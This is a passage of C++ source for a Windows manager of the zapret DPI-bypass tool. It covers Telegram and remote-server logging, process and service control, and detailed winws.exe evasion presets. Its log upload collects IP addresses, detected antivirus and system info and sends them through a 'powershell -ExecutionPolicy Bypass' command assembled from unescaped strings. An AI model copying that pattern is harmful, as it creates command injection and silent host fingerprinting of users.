    std::string telegramMessage = emoji + " <b>" + logType + "</b>\n\n";
    telegramMessage += "📝 <b>Сообщение:</b> " + message + "\n";
    
    if (!ip.empty()) {
        telegramMessage += "🌐 <b>IP:</b> " + ip + "\n";
    }
    
    if (!errorCode.empty()) {
        telegramMessage += "🔴 <b>Код ошибки:</b> " + errorCode + "\n";
    }
    
    telegramMessage += "\n⏰ <b>Время:</b> " + FormatTimestamp();
    
    return telegramMessage;
}

// Отправка лога в Telegram
void SendLogToTelegram(const std::wstring& exeDir, const std::string& logType, const std::string& message,
                       const std::string& errorCode = "", const std::string& blockingInfo = "") {
    if (!currentSettings.telegram_enabled || currentSettings.telegram_bot_token.empty()) {
        return;
    }
    
    std::string localIP = GetLocalIPAddresses();
    std::string telegramMessage = FormatLogForTelegram(logType, message, errorCode, localIP);
    
    if (SendTelegramMessage(telegramMessage, currentSettings.telegram_bot_token, currentSettings.telegram_chat_id)) {
        // Успешно отправлено
    }
}

// ==================== VDS ИНТЕГРАЦИЯ 2025 ====================

// Отправка лога на VDS сервер
bool SendLogToVDS(const std::string& logData, const std::string& logType) {
    if (!currentSettings.vds_enabled || currentSettings.vds_api_url.empty()) {
        return false;
    }
    
    std::string url = currentSettings.vds_api_url + "/api/logs";
    std::string pcId = GetPCID();
    std::string timestamp = FormatTimestamp();
    std::string localIP = GetLocalIPAddresses();
    std::string externalIP = GetExternalIPAddress();
    std::string antivirus = DetectAntivirus();
    std::string systemInfo = GetSystemInfo();
    
    // Формируем JSON данные через PowerShell
    std::wstring psCommand = L"powershell -ExecutionPolicy Bypass -Command \"try { $body = @{";
    psCommand += L"pc_id='";
    psCommand += std::wstring(pcId.begin(), pcId.end());
    psCommand += L"'; log_type='";
    psCommand += std::wstring(logType.begin(), logType.end());
    psCommand += L"'; log_data='";
    psCommand += std::wstring(logData.begin(), logData.end());
    psCommand += L"'; timestamp='";
    psCommand += std::wstring(timestamp.begin(), timestamp.end());
    psCommand += L"'; local_ip='";
    psCommand += std::wstring(localIP.begin(), localIP.end());
    psCommand += L"'; external_ip='";
    psCommand += std::wstring(externalIP.begin(), externalIP.end());
    psCommand += L"'; antivirus='";
    psCommand += std::wstring(antivirus.begin(), antivirus.end());
    psCommand += L"'; system_info='";
    psCommand += std::wstring(systemInfo.begin(), systemInfo.end());
    psCommand += L"'";
    
    if (!currentSettings.vds_api_key.empty()) {
        psCommand += L"; api_key='";
        psCommand += std::wstring(currentSettings.vds_api_key.begin(), currentSettings.vds_api_key.end());
        psCommand += L"'";
    }
    
    psCommand += L"} | ConvertTo-Json -Compress; $response = Invoke-RestMethod -Uri '";
    psCommand += std::wstring(url.begin(), url.end());
    psCommand += L"' -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 10 -UseBasicParsing -ErrorAction Stop; Write-Host 'OK' } catch { Write-Host 'ERROR' }\"";
    
    FILE* vdsPipe = _wpopen(psCommand.c_str(), L"r");
    if (vdsPipe) {
        wchar_t buffer[128];
        std::wstring output = L"";
        while (fgetws(buffer, sizeof(buffer), vdsPipe) != NULL) {
            output += buffer;
        }
        _pclose(vdsPipe);
        
        return output.find(L"OK") != std::wstring::npos;
    }
    
    return false;
}

// Проверка статуса VDS сервера
bool CheckVDSStatus() {
    if (!currentSettings.vds_enabled || currentSettings.vds_api_url.empty()) {
        return false;
    }
    
    std::string url = currentSettings.vds_api_url + "/api/status";
    
    std::wstring psCommand = L"powershell -ExecutionPolicy Bypass -Command \"try { $response = Invoke-RestMethod -Uri '";
    psCommand += std::wstring(url.begin(), url.end());
    psCommand += L"' -Method Get -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop; Write-Host 'OK' } catch { Write-Host 'ERROR' }\"";
    
    FILE* statusPipe = _wpopen(psCommand.c_str(), L"r");
    if (statusPipe) {
        wchar_t buffer[128];
        std::wstring output = L"";
        while (fgetws(buffer, sizeof(buffer), statusPipe) != NULL) {
            output += buffer;
        }
        _pclose(statusPipe);
        
        return output.find(L"OK") != std::wstring::npos;
    }
    
    return false;
}

// Поиск и завершение процесса winws.exe из папки ./bin/
bool FindAndTerminateWinwsProcess(const std::wstring& binPath) {
    std::wstring exeDir = GetExePath();
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        PrintRed("Ошибка при создании снимка процессов.");
        LogError(exeDir, "Ошибка при создании снимка процессов", GetLastError());
        return false;
    }

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(hSnapshot, &pe32)) {
        PrintRed("Ошибка при получении первого процесса.");
        LogError(exeDir, "Ошибка при получении первого процесса", GetLastError());
        CloseHandle(hSnapshot);
        return false;
    }

    bool found = false;
    do {
        if (wcscmp(pe32.szExeFile, L"winws.exe") == 0) {
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
            if (hProcess) {
                wchar_t processPath[MAX_PATH];
                if (GetModuleFileNameExW(hProcess, NULL, processPath, MAX_PATH) > 0) {
                    std::wstring fullPath(processPath);
                    if (fullPath.find(binPath) != std::wstring::npos) {
                        PrintYellow("Найден процесс winws.exe из нашей директории. PID: " + std::to_string(pe32.th32ProcessID));
                        HMODULE hMods[1024];
                        DWORD cbNeeded;
                        if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
                            for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
                                wchar_t modName[MAX_PATH];
                                if (GetModuleFileNameExW(hProcess, hMods[i], modName, MAX_PATH)) {
                                    std::wstring modulePath(modName);
                                    if (modulePath.find(L"WinDivert64.dll") != std::wstring::npos) {
                                        PrintGreen("В процессе winws.exe загружен WinDivert64.dll");
                                    }
                                }
                            }
                        }
                        if (TerminateProcess(hProcess, 0)) {
                            PrintGreen("Процесс winws.exe успешно завершен.");
                            LogSystem(exeDir, "Процесс winws.exe успешно завершен. PID: " + std::to_string(pe32.th32ProcessID));
                            found = true;
                        } else {
                            DWORD error = GetLastError();
                            PrintRed("Ошибка при завершении процесса winws.exe. Код: " + std::to_string(error));
                            LogError(exeDir, "Ошибка при завершении процесса winws.exe. PID: " + std::to_string(pe32.th32ProcessID), error);
                        }
                    }
                }
                CloseHandle(hProcess);
            }
        }
    } while (Process32NextW(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return found;
}

bool IsWinDivertDriverLoaded() {
    FILE* pipe = _wpopen(L"sc query WinDivert", L"r");
    if (pipe) {
        wchar_t buffer[128];
        std::wstring output = L"";
        
        while (fgetws(buffer, sizeof(buffer), pipe) != NULL) {
            output += buffer;
        }
        _pclose(pipe);
        
        if (output.find(L"RUNNING") != std::wstring::npos) {
            PrintGreen("Служба WinDivert запущена (драйвер загружен).");
            return true;
        }
    }
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return false;
    }

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return false;
    }

    bool found = false;
    do {
        if (wcscmp(pe32.szExeFile, L"winws.exe") == 0) {
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
            if (hProcess) {
                HMODULE hMods[1024];
                DWORD cbNeeded;
                if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
                    for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
                        wchar_t modName[MAX_PATH];
                        if (GetModuleFileNameExW(hProcess, hMods[i], modName, MAX_PATH)) {
                            std::wstring modulePath(modName);
                            if (modulePath.find(L"WinDivert64.dll") != std::wstring::npos) {
                                PrintGreen("Драйвер WinDivert64.sys загружен через процесс winws.exe. PID: " + std::to_string(pe32.th32ProcessID));
                                found = true;
                                break;
                            }
                        }
                    }
                }
                CloseHandle(hProcess);
            }
        }
    } while (Process32NextW(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    
    if (!found) {
        PrintRed("Драйвер WinDivert64.sys не загружен.");
    }
    
    return found;
}

// Проверка статуса сервиса
void CheckServiceStatus() {
    std::wstring serviceName = L"zapret";
    
    // Проверяем статус сервиса zapret
    FILE* pipe = _wpopen((L"sc query \"" + serviceName + L"\"").c_str(), L"r");
    if (pipe) {
        wchar_t buffer[128];
        std::wstring output = L"";
        
        while (fgetws(buffer, sizeof(buffer), pipe) != NULL) {
            output += buffer;
        }
        _pclose(pipe);
        
        if (output.find(L"RUNNING") != std::wstring::npos) {
            PrintGreen("Сервис zapret запущен.");
        } else if (output.find(L"STOPPED") != std::wstring::npos) {
            PrintRed("Сервис zapret остановлен.");
        } else if (output.find(L"STOP_PENDING") != std::wstring::npos) {
            PrintYellow("Сервис zapret останавливается. Это может быть вызвано конфликтом с другим обходом.");
        } else {
            PrintRed("Не удалось определить статус сервиса zapret.");
        }
    } else {
        PrintRed("Ошибка при проверке статуса сервиса zapret.");
    }
    
    // Проверяем наличие процессов winws.exe
    FILE* pipe2 = _wpopen(L"tasklist /FI \"IMAGENAME eq winws.exe\"", L"r");
    if (pipe2) {
        wchar_t buffer[128];
        std::wstring output = L"";
        
        while (fgetws(buffer, sizeof(buffer), pipe2) != NULL) {
            output += buffer;
        }
        _pclose(pipe2);
        
        if (output.find(L"winws.exe") != std::wstring::npos) {
            PrintGreen("Процесс winws.exe активен.");
        } else {
            PrintRed("Процесс winws.exe не найден.");
        }
    } else {
        PrintRed("Ошибка при проверке процессов winws.exe.");
    }
    
    // Проверяем статус WinDivert
    serviceName = L"WinDivert";
    pipe = _wpopen((L"sc query \"" + serviceName + L"\"").c_str(), L"r");
    if (pipe) {
        wchar_t buffer[128];
        std::wstring output = L"";
        
        while (fgetws(buffer, sizeof(buffer), pipe) != NULL) {
            output += buffer;
        }
        _pclose(pipe);
        
        if (output.find(L"RUNNING") != std::wstring::npos) {
            PrintRed("Сервис WinDivert запущен. Это может вызвать конфликты.");
        } else if (output.find(L"STOPPED") != std::wstring::npos) {
            PrintGreen("Сервис WinDivert остановлен.");
        } else if (output.find(L"STOP_PENDING") != std::wstring::npos) {
            PrintYellow("Сервис WinDivert останавливается.");
        } else {
            PrintGreen("Сервис WinDivert не установлен.");
        }
    }
}

// Функция для удаления сервиса
void RemoveService() {
    std::wstring serviceName = L"zapret";
    
    // Останавливаем и удаляем сервис zapret
    int result = _wsystem((L"net stop " + serviceName).c_str());
    result = _wsystem((L"sc delete " + serviceName).c_str());
    
    if (result == 0) {
        PrintGreen("Сервис zapret успешно удален.");
        currentSettings.service_installed = false;
    } else {
        PrintRed("Ошибка при удалении сервиса zapret.");
    }
    
    // Удаляем сервис WinDivert, если он существует
    _wsystem(L"net stop \"WinDivert\"");
    _wsystem(L"sc delete \"WinDivert\"");
    _wsystem(L"net stop \"WinDivert14\"");
    _wsystem(L"sc delete \"WinDivert14\"");
    
    // Завершаем процессы winws.exe
    _wsystem(L"taskkill /IM winws.exe /F");
    
    PrintGreen("Все связанные процессы и сервисы завершены.");
}

void InstallService(const std::wstring& exeDir) {
    std::wstring BIN = exeDir + L"\\bin";
    std::wstring LISTS = exeDir + L"\\lists";
    
    // Объявляем переменные здесь
    std::wstring cmdFilePath;
    std::wofstream cmdFile;
    
    // Безопасно получаем значение GameFilter из переменной окружения
    wchar_t* gameFilterValue = nullptr;
    size_t len = 0;
    errno_t err = _wdupenv_s(&gameFilterValue, &len, L"GameFilter");
    std::wstring GameFilter;
    
    if (err == 0 && gameFilterValue != nullptr) {
        GameFilter = gameFilterValue;
        free(gameFilterValue);
    } else {
        GameFilter = L"12"; // Значение по умолчанию
    }
    
    // Выводим список режимов для выбора
    std::cout << "Выберите режим для установки сервиса:\n";
    std::cout << "1 - ALT1\n";
    std::cout << "2 - ALT2\n";
    std::cout << "3 - ALT3\n";
    std::cout << "4 - ALT4\n";
    std::cout << "5 - ALT5\n";
    std::cout << "6 - ALT6\n";
    std::cout << "7 - FAKE TLS ALT1\n";
    std::cout << "8 - FAKE TLS AUTO ALT1\n";
    std::cout << "9 - FAKE TLS AUTO ALT2\n";
    std::cout << "10 - FAKE TLS AUTO\n";
    std::cout << "11 - FAKE TLS\n";
    std::cout << "12 - ALT МГТС1\n";
    std::cout << "13 - ALT МГТС2\n";
    std::cout << "14 - GENERAL1\n";
    std::cout << "15 - ALT FIX CLOUDFLARE SERVICES\n";
    
    int choice;
    std::cin >> choice;
    
    if (choice < 1 || choice > 15) {
        PrintRed("Ошибка: неверный выбор.");
        return;
    }
    
    // Формируем параметры для winws.exe
    std::wostringstream params;
    
    switch (choice) {
        case 1: // ALT1
            params << L"--wf-tcp=80,443," << GameFilter << L" "
                   << L"--wf-udp=443,50000-50100," << GameFilter << L" "
                   << L"--filter-udp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                   << L"--filter-udp=50000-50100 --filter-l7=discord,stun --dpi-desync=fake --dpi-desync-repeats=6 --new "
                   << L"--filter-tcp=80 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                   << L"--filter-tcp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,fakedsplit --dpi-desync-autottl=5 --dpi-desync-repeats=6 --dpi-desync-fooling=badseq --dpi-desync-fake-tls=\"" << BIN << L"\\tls_clienthello_www_google_com.bin\" --new "
                   << L"--filter-udp=443 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                   << L"--filter-tcp=80 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                   << L"--filter-tcp=443," << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,fakedsplit --dpi-desync-autottl=5 --dpi-desync-repeats=6 --dpi-desync-fooling=badseq --dpi-desync-fake-tls=\"" << BIN << L"\\tls_clienthello_www_google_com.bin\" --new "
                   << L"--filter-udp=" << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-autottl=2 --dpi-desync-repeats=12 --dpi-desync-any-protocol=1 --dpi-desync-fake-unknown-udp=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --dpi-desync-cutoff=n3";
            break;
            
        case 2: // ALT2
            params << L"--wf-tcp=80,443," << GameFilter << L" "
                   << L"--wf-udp=443,50000-50100," << GameFilter << L" "
                   << L"--filter-udp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                   << L"--filter-udp=50000-50100 --filter-l7=discord,stun --dpi-desync=fake --dpi-desync-repeats=6 --new "
                   << L"--filter-tcp=80 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                   << L"--filter-tcp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=multisplit --dpi-desync-split-seqovl=652 --dpi-desync-split-pos=2 --dpi-desync-split-seqovl-pattern=\"" << BIN << L"\\tls_clienthello_www_google_com.bin\" --new "
                   << L"--filter-udp=443 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                   << L"--filter-tcp=80 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                   << L"--filter-tcp=443," << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=multisplit --dpi-desync-split-seqovl=652 --dpi-desync-split-pos=2 --dpi-desync-split-seqovl-pattern=\"" << BIN << L"\\tls_clienthello_www_google_com.bin\" --new "
                   << L"--filter-udp=" << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-autottl=2 --dpi-desync-repeats=12 --dpi-desync-any-protocol=1 --dpi-desync-fake-unknown-udp=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --dpi-desync-cutoff=n2";
            break;
            
        case 3: // ALT3
            params << L"--wf-tcp=80,443," << GameFilter << L" "
                   << L"--wf-udp=443,50000-50100," << GameFilter << L" "
                   << L"--filter-udp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                   << L"--filter-udp=50000-50100 --filter-l7=discord,stun --dpi-desync=fake --dpi-desync-repeats=6 --new "
                   << L"--filter-tcp=80 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                   << L"--filter-tcp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fakedsplit --dpi-desync-split-pos=1 --dpi-desync-autottl --dpi-desync-fooling=badseq --dpi-desync-repeats=8 --new "
                   << L"--filter-udp=443 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                   << L"--filter-tcp=80 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                   << L"--filter-tcp=443," << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fakedsplit --dpi-desync-split-pos=1 --dpi-desync-autottl --dpi-desync-fooling=badseq --dpi-desync-repeats=8 --new "
                   << L"--filter-udp=" << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-autottl=2 --dpi-desync-repeats=10 --dpi-desync-any-protocol=1 --dpi-desync-fake-unknown-udp=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --dpi-desync-cutoff=n2";
            break;
            
        case 4: // ALT4
            params << L"--wf-tcp=80,443," << GameFilter << L" "
                   << L"--wf-udp=443,50000-50100," << GameFilter << L" "
                   << L"--filter-udp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                   << L"--filter-udp=50000-50100 --filter-l7=discord,stun --dpi-desync=fake --dpi-desync-repeats=6 --new "
                   << L"--filter-tcp=80 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                   << L"--filter-tcp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,multisplit --dpi-desync-repeats=6 --dpi-desync-fooling=md5sig --dpi-desync-fake-tls=\"" << BIN << L"\\tls_clienthello_www_google_com.bin\" --new "
                   << L"--filter-udp=443 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                   << L"--filter-tcp=80 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                   << L"--filter-tcp=443," << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,multisplit --dpi-desync-repeats=6 --dpi-desync-fooling=md5sig --dpi-desync-fake-tls=\"" << BIN << L"\\tls_clienthello_www_google_com.bin\" --new "
                   << L"--filter-udp=" << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-autottl=2 --dpi-desync-repeats=10 --dpi-desync-any-protocol=1 --dpi-desync-fake-unknown-udp=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --dpi-desync-cutoff=n2";
            break;
            
        case 5: // ALT5
            params << L"--wf-tcp=80,443," << GameFilter << L" "
                   << L"--wf-udp=443,50000-50100," << GameFilter << L" "
                   << L"--filter-udp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                   << L"--filter-udp=50000-50100 --filter-l7=discord,stun --dpi-desync=fake --dpi-desync-repeats=6 --new "
                   << L"--filter-tcp=80 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                   << L"--filter-l3=ipv4 --filter-tcp=443," << GameFilter << L" --dpi-desync=syndata --new "
                   << L"--filter-tcp=80 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                   << L"--filter-udp=443 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                   << L"--filter-udp=" << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-autottl=2 --dpi-desync-repeats=14 --dpi-desync-any-protocol=1 --dpi-desync-fake-unknown-udp=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --dpi-desync-cutoff=n3";
            break;
            
        case 6: // ALT6
            params << L"--wf-tcp=80,443," << GameFilter << L" "
                   << L"--wf-udp=443,50000-50100," << GameFilter << L" "
                   << L"--filter-udp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                   << L"--filter-udp=50000-50100 --filter-l7=discord,stun --dpi-desync=fake --dpi-desync-repeats=6 --new "
                   << L"--filter-tcp=80 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                   << L"--filter-tcp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=multisplit --dpi-desync-split-seqovl=681 --dpi-desync-split-pos=1 --dpi-desync-split-seqovl-pattern=\"" << BIN << L"\\tls_clienthello_www_google_com.bin\" --new "
                   << L"--filter-udp=443 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                   << L"--filter-tcp=80 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                   << L"--filter-tcp=443," << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=multisplit --dpi-desync-split-seqovl=681 --dpi-desync-split-pos=1 --dpi-desync-split-seqovl-pattern=\"" << BIN << L"\\tls_clienthello_www_google_com.bin\" --new "
                   << L"--filter-udp=" << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-autottl=2 --dpi-desync-repeats=12 --dpi-desync-any-protocol=1 --dpi-desync-fake-unknown-udp=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --dpi-desync-cutoff=n2";
            break;
            
        case 7: // FAKE TLS ALT1
            params << L"--wf-tcp=80,443," << GameFilter << L" "
                   << L"--wf-udp=443,50000-50100," << GameFilter << L" "
                   << L"--filter-udp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                   << L"--filter-udp=50000-50100 --filter-l7=discord,stun --dpi-desync=fake --dpi-desync-repeats=6 --new "
                   << L"--filter-tcp=80 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                   << L"--filter-tcp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-fooling=md5sig --dpi-desync-fake-tls-mod=rnd,rndsni,padencap --new "
                   << L"--filter-udp=443 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                   << L"--filter-tcp=80 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                   << L"--filter-tcp=443," << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-fooling=md5sig --dpi-desync-fake-tls-mod=rnd,rndsni,padencap --new "
                   << L"--filter-udp=" << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-autottl=2 --dpi-desync-repeats=10 --dpi-desync-any-protocol=1 --dpi-desync-fake-unknown-udp=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --dpi-desync-cutoff=n2";
            break;
            
        case 8: // FAKE TLS AUTO ALT1
            params << L"--wf-tcp=80,443," << GameFilter << L" "
                   << L"--wf-udp=443,50000-50100," << GameFilter << L" "
                   << L"--filter-udp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-repeats=11 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                   << L"--filter-udp=50000-50100 --filter-l7=discord,stun --dpi-desync=fake --dpi-desync-repeats=6 --new "
                   << L"--filter-tcp=80 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,fakedsplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                   << L"--filter-tcp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,fakedsplit --dpi-desync-split-pos=1 --dpi-desync-autottl --dpi-desync-fooling=badseq --dpi-desync-repeats=8 --dpi-desync-fake-tls-mod=rnd,dupsid,sni=www.google.com --new "
                   << L"--filter-udp=443 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-repeats=11 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                   << L"--filter-tcp=80 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,fakedsplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                   << L"--filter-tcp=443," << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,fakedsplit --dpi-desync-split-pos=1 --dpi-desync-autottl --dpi-desync-fooling=badseq --dpi-desync-repeats=8 --dpi-desync-fake-tls-mod=rnd,dupsid,sni=www.google.com --new "
                   << L"--filter-udp=" << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-autottl=2 --dpi-desync-repeats=10 --dpi-desync-any-protocol=1 --dpi-desync-fake-unknown-udp=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --dpi-desync-cutoff=n2";
            break;
            
        case 9: // FAKE TLS AUTO ALT2
            params << L"--wf-tcp=80,443," << GameFilter << L" "
                   << L"--wf-udp=443,50000-50100," << GameFilter << L" "
                   << L"--filter-udp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-repeats=11 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                   << L"--filter-udp=50000-50100 --filter-l7=discord,stun --dpi-desync=fake --dpi-desync-repeats=6 --new "
                   << L"--filter-tcp=80 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,fakedsplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                   << L"--filter-tcp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,multisplit --dpi-desync-split-seqovl=681 --dpi-desync-split-pos=1 --dpi-desync-fooling=badseq --dpi-desync-repeats=8 --dpi-desync-split-seqovl-pattern=\"" << BIN << L"\\tls_clienthello_www_google_com.bin\" --dpi-desync-fake-tls-mod=rnd,dupsid,sni=www.google.com --new "
                   << L"--filter-udp=443 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-repeats=11 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                   << L"--filter-tcp=80 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,fakedsplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
